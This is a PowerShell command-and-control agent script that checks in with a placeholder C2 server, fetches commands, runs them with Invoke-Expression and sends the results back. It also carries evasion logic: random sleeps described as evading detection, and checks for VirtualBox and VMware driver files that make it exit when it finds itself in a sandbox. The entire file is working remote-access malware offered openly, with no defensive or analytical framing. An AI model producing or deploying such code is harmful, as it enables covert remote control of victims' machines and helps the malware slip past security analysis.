# Agent Script (agent.ps1)
$C2Server = "https://your-c2-server.com"
$AgentID = [guid]::NewGuid().ToString()

# Sleep for a random interval between 10 and 60 seconds to evade detection
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)

Function Write-Log {
    param (
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

Function Send-Data {
    param (
        [string]$Endpoint,
        [hashtable]$Data
    )
    $Url = "$C2Server/$Endpoint"
    $Response = Invoke-RestMethod -Uri $Url -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json"
    return $Response
}

Function Execute-Command {
    param (
        [string]$Command
    )
    Write-Log "Executing command: $Command"
    try {
        $Result = Invoke-Expression $Command
        return $Result
    } catch {
        return $_.Exception.Message
    }
}

Function Check-Sandbox {
    # Check for common sandbox artifacts
    $sandbox_indicators = @("C:\Windows\System32\drivers\VBoxMouse.sys", "C:\Windows\System32\drivers\vmhgfs.sys")
    foreach ($indicator in $sandbox_indicators) {
        if (Test-Path $indicator) {
            Write-Log "Sandbox detected: $indicator" "Red"
            Exit
        }
    }
}

Function PolymorphicSleep {
    # Generate a polymorphic sleep interval
    $interval = Get-Random -Minimum 10 -Maximum 60
    Start-Sleep -Seconds $interval
}

Function Main {
    Write-Log "Agent started. ID: $AgentID" "Cyan"
    Check-Sandbox
    while ($true) {
        $Response = Send-Data "checkin" @{ "AgentID" = $AgentID }
        if ($Response.Command) {
            $Result = Execute-Command $Response.Command
            Send-Data "result" @{ "AgentID" = $AgentID; "Result" = $Result }
        }
        PolymorphicSleep
    }
}

Main
